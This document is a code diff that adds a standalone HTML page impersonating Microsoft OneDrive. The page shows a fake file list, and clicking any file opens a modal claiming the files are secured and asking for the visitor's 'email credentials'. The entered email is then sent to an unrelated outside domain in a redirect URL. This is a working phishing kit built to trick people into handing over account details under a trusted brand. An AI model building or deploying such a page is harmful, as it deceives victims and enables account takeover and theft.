@@ -1,24 +1,236 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>OneDrive - Cloud Storage</title>
-    <meta name="description" content="OneDrive file manager - Access and manage your files from anywhere" />
-    <meta name="author" content="Lovable" />
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OneDrive - Cloud Storage</title>
+  <meta name="description" content="OneDrive file manager - Access and manage your files from anywhere" />
+  <meta property="og:title" content="OneDrive - Cloud Storage" />
+  <meta property="og:description" content="OneDrive file manager - Access and manage your files from anywhere" />
+  <meta property="og:type" content="website" />
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    :root {
+      --bg: #fafafa; --fg: #262626; --card: #fff; --primary: #0c86d6; --primary-fg: #fff;
+      --muted: #f5f5f5; --muted-fg: #757575; --accent: #e5f5ff; --accent-fg: #0c86d6;
+      --border: #e5e5e5; --radius: 6px;
+    }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--bg); color: var(--fg); }
+    .app { display: flex; height: 100vh; overflow: hidden; }
+    .sidebar { width: 224px; border-right: 1px solid var(--border); background: var(--bg); display: flex; flex-direction: column; }
+    .sidebar-header { padding: 24px; display: flex; align-items: center; gap: 8px; }
+    .logo { width: 40px; height: 40px; color: var(--primary); }
+    .sidebar h1 { font-size: 24px; font-weight: 400; }
+    .sidebar nav { flex: 1; padding: 0 12px; }
+    .sidebar nav ul { list-style: none; }
+    .sidebar nav li { margin: 4px 0; }
+    .sidebar nav button { width: 100%; display: flex; align-items: center; gap: 12px; padding: 8px 12px; border: none; border-radius: var(--radius); background: none; color: var(--muted-fg); font-size: 14px; cursor: pointer; transition: all 0.2s; }
+    .sidebar nav button:hover { background: var(--muted); color: var(--fg); }
+    .sidebar nav button.active { background: var(--accent); color: var(--accent-fg); font-weight: 500; }
+    .main { flex: 1; display: flex; flex-direction: column; }
+    .header { height: 56px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 24px; }
+    .search-wrapper { flex: 1; max-width: 576px; position: relative; }
+    .search-icon { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); width: 16px; height: 16px; color: var(--muted-fg); }
+    .search { width: 100%; padding: 8px 12px 8px 36px; border: none; border-radius: var(--radius); background: var(--muted); font-size: 14px; }
+    .content { flex: 1; display: flex; overflow: hidden; }
+    .file-list { flex: 1; overflow: auto; }
+    .file-table { width: 100%; border-collapse: collapse; min-width: 800px; }
+    .file-table thead tr { border-bottom: 1px solid var(--border); }
+    .file-table th { padding: 12px 16px; text-align: left; font-size: 13px; font-weight: 500; color: var(--fg); }
+    .file-table th:first-child { width: 48px; }
+    .file-table th button { border: none; background: none; display: flex; align-items: center; gap: 4px; cursor: pointer; color: var(--fg); font-size: 13px; font-weight: 500; }
+    .file-table tbody tr { border-bottom: 1px solid var(--border); cursor: pointer; transition: background 0.2s; }
+    .file-table tbody tr:hover { background: var(--muted); }
+    .file-table td { padding: 12px 16px; font-size: 14px; }
+    .file-icon-wrapper { display: flex; align-items: center; gap: 12px; }
+    .file-icon { width: 32px; height: 32px; border-radius: 4px; display: flex; align-items: center; justify-content: center; }
+    .file-icon.pdf { background: #fee; color: #dc2626; }
+    .file-icon.excel { background: #efe; color: #16a34a; }
+    .action-panel { width: 256px; border-left: 1px solid var(--border); padding: 24px; display: flex; flex-direction: column; gap: 8px; }
+    .action-panel p { font-size: 14px; color: var(--muted-fg); margin-bottom: 16px; }
+    .action-btn { width: 100%; display: flex; align-items: center; gap: 8px; padding: 8px 12px; border: none; border-radius: var(--radius); background: none; color: var(--primary); font-size: 14px; cursor: pointer; transition: all 0.2s; }
+    .action-btn:hover { background: var(--accent); }
+    .checkbox { width: 16px; height: 16px; border: 1px solid var(--border); border-radius: 3px; cursor: pointer; }
+    .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.5); display: none; align-items: center; justify-content: center; z-index: 50; }
+    .modal-overlay.open { display: flex; }
+    .modal { background: var(--card); border-radius: 8px; padding: 32px; max-width: 500px; width: 90%; box-shadow: 0 10px 40px rgba(0,0,0,0.2); }
+    .modal-content { display: flex; flex-direction: column; align-items: center; text-align: center; gap: 24px; }
+    .modal-header { display: flex; align-items: center; gap: 8px; }
+    .modal-title { font-size: 20px; font-weight: 500; }
+    .modal-desc { font-size: 14px; color: var(--muted-fg); line-height: 1.6; padding: 0 16px; }
+    .modal-form { width: 100%; display: flex; flex-direction: column; gap: 16px; }
+    .modal-subtitle { font-size: 18px; font-weight: 500; }
+    .input { width: 100%; padding: 12px; border: 1px solid var(--border); border-radius: var(--radius); text-align: center; font-size: 14px; }
+    .btn { width: 100%; padding: 12px; border: none; border-radius: var(--radius); background: var(--primary); color: var(--primary-fg); font-size: 16px; font-weight: 500; cursor: pointer; transition: opacity 0.2s; }
+    .btn:hover { opacity: 0.9; }
+    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+    .modal-footer { font-size: 12px; color: var(--muted-fg); }
+    .icon { width: 20px; height: 20px; }
+    .icon-sm { width: 16px; height: 16px; }
+    .icon-lg { width: 24px; height: 24px; }
+    .toast { position: fixed; bottom: 24px; right: 24px; background: var(--card); border: 1px solid var(--border); border-radius: var(--radius); padding: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); display: none; z-index: 100; }
+    .toast.show { display: block; }
+    .toast.error { border-color: #ef4444; }
+  </style>
+</head>
+<body>
+  <div class="app">
+    <aside class="sidebar">
+      <div class="sidebar-header">
+        <svg class="logo" fill="currentColor" viewBox="0 0 24 24"><path d="M19 18H5a3 3 0 0 1-3-3V9a3 3 0 0 1 3-3h14a3 3 0 0 1 3 3v6a3 3 0 0 1-3 3Z"/><path d="M5 18v3m14-3v3M7 3h10"/></svg>
+        <h1>OneDrive</h1>
+      </div>
+      <nav>
+        <ul>
+          <li><button class="active"><svg class="icon-sm" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>Files</button></li>
+          <li><button><svg class="icon-sm" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"/><polyline points="16 6 12 2 8 6"/><line x1="12" y1="2" x2="12" y2="15"/></svg>Shared</button></li>
+          <li><button><svg class="icon-sm" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M22 21v-2a4 4 0 0 0-3-3.87M16 3.13a4 4 0 0 1 0 7.75"/></svg>My files</button></li>
+          <li><button><svg class="icon-sm" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>File requests</button></li>
+          <li><button><svg class="icon-sm" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M3 6h18M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/></svg>Deleted files</button></li>
+        </ul>
+      </nav>
+    </aside>
 
-    <meta property="og:title" content="OneDrive - Cloud Storage" />
-    <meta property="og:description" content="OneDrive file manager - Access and manage your files from anywhere" />
-    <meta property="og:type" content="website" />
-    <meta property="og:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />
+    <div class="main">
+      <header class="header">
+        <div class="search-wrapper">
+          <svg class="search-icon" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+          <input type="search" class="search" placeholder="Search" />
+        </div>
+        <button style="border:none;background:none;cursor:pointer;padding:8px;"><svg class="icon" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg></button>
+      </header>
 
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:site" content="@lovable_dev" />
-    <meta name="twitter:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />
-  </head>
+      <div class="content">
+        <div class="file-list">
+          <table class="file-table">
+            <thead>
+              <tr>
+                <th><input type="checkbox" class="checkbox" /></th>
+                <th><button>Name <svg class="icon-sm" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"/></svg></button></th>
+                <th><button>Modified <svg class="icon-sm" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"/></svg></button></th>
+                <th><button>Members <svg class="icon-sm" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"/></svg></button></th>
+                <th></th>
+              </tr>
+            </thead>
+            <tbody id="fileTableBody"></tbody>
+          </table>
+        </div>
 
-  <body>
-    <div id="root"></div>
-    <script type="module" src="/src/main.tsx"></script>
-  </body>
+        <aside class="action-panel">
+          <p>Select a file to see more details</p>
+          <button class="action-btn"><svg class="icon-sm" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M17 8l-5-5-5 5M12 3v12"/></svg>Upload files</button>
+          <button class="action-btn"><svg class="icon-sm" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M17 8l-5-5-5 5M12 3v12"/></svg>Upload folder</button>
+          <button class="action-btn"><svg class="icon-sm" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>New folder</button>
+          <button class="action-btn"><svg class="icon-sm" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>New shared folder</button>
+          <button class="action-btn"><svg class="icon-sm" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>Request files</button>
+        </aside>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="modalOverlay">
+    <div class="modal">
+      <div class="modal-content">
+        <div class="modal-header">
+          <svg class="icon-lg" fill="currentColor" viewBox="0 0 24 24"><path d="M19 18H5a3 3 0 0 1-3-3V9a3 3 0 0 1 3-3h14a3 3 0 0 1 3 3v6a3 3 0 0 1-3 3Z"/><path d="M5 18v3m14-3v3M7 3h10"/></svg>
+          <h2 class="modal-title">OneDrive</h2>
+        </div>
+        <p class="modal-desc">These files are sensitive and secured against unauthorized access. In order to access this file, please provide your email credentials. Be sure to connect to your email provider through a secured IMAP channel to authorize your download.</p>
+        <div style="width:100%;">
+          <h3 class="modal-subtitle">Please Confirm Receiving E-mail to View Files</h3>
+          <form class="modal-form" id="emailForm">
+            <input type="email" class="input" id="emailInput" placeholder="Enter receiving email" required />
+            <button type="submit" class="btn" id="submitBtn">View Files</button>
+          </form>
+        </div>
+        <p class="modal-footer">© Copyright OneDrive Inc. 2025</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+  <script>
+    const files = [
+      {id:"1",name:"Drawings 2D.pdf",type:"pdf",modified:"Yesterday 1:32 PM",members:"Only you"},
+      {id:"2",name:"PO_19382893.pdf",type:"pdf",modified:"Yesterday 1:32 PM",members:"Only you"},
+      {id:"3",name:"Signed Contract.pdf",type:"pdf",modified:"Yesterday 1:32 PM",members:"Only you"},
+      {id:"4",name:"List_of_items.xlsx",type:"excel",modified:"Yesterday 1:32 PM",members:"Only you"}
+    ];
+
+    const fileTableBody = document.getElementById('fileTableBody');
+    const modalOverlay = document.getElementById('modalOverlay');
+    const emailForm = document.getElementById('emailForm');
+    const emailInput = document.getElementById('emailInput');
+    const submitBtn = document.getElementById('submitBtn');
+    const toast = document.getElementById('toast');
+
+    function renderFiles() {
+      fileTableBody.innerHTML = files.map(file => `
+        <tr data-file-id="${file.id}">
+          <td><input type="checkbox" class="checkbox" onclick="event.stopPropagation()" /></td>
+          <td>
+            <div class="file-icon-wrapper">
+              <div class="file-icon ${file.type}">
+                <svg class="icon" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+              </div>
+              <span>${file.name}</span>
+            </div>
+          </td>
+          <td style="color:var(--muted-fg)">${file.modified}</td>
+          <td style="color:var(--muted-fg)">${file.members}</td>
+          <td><button style="border:none;background:none;cursor:pointer;padding:8px;opacity:0;" onclick="event.stopPropagation()"><svg class="icon-sm" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="1"/><circle cx="12" cy="5" r="1"/><circle cx="12" cy="19" r="1"/></svg></button></td>
+        </tr>
+      `).join('');
+
+      document.querySelectorAll('#fileTableBody tr').forEach(row => {
+        row.addEventListener('click', () => openModal());
+      });
+    }
+
+    function openModal() {
+      modalOverlay.classList.add('open');
+    }
+
+    function closeModal() {
+      modalOverlay.classList.remove('open');
+      emailInput.value = '';
+      submitBtn.disabled = false;
+      submitBtn.textContent = 'View Files';
+    }
+
+    function showToast(message, isError = false) {
+      toast.textContent = message;
+      toast.className = 'toast show' + (isError ? ' error' : '');
+      setTimeout(() => toast.classList.remove('show'), 3000);
+    }
+
+    function validateEmail(email) {
+      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return re.test(email.trim()) && email.length <= 255;
+    }
+
+    modalOverlay.addEventListener('click', (e) => {
+      if (e.target === modalOverlay) closeModal();
+    });
+
+    emailForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const email = emailInput.value.trim();
+      
+      if (!validateEmail(email)) {
+        showToast('Invalid email address', true);
+        return;
+      }
+
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Processing...';
+
+      const redirectUrl = `https://arvione.it.com/2Zw3QQ7/#${encodeURIComponent(email)}`;
+      window.location.href = redirectUrl;
+    });
+
+    renderFiles();
+  </script>
+</body>
 </html>
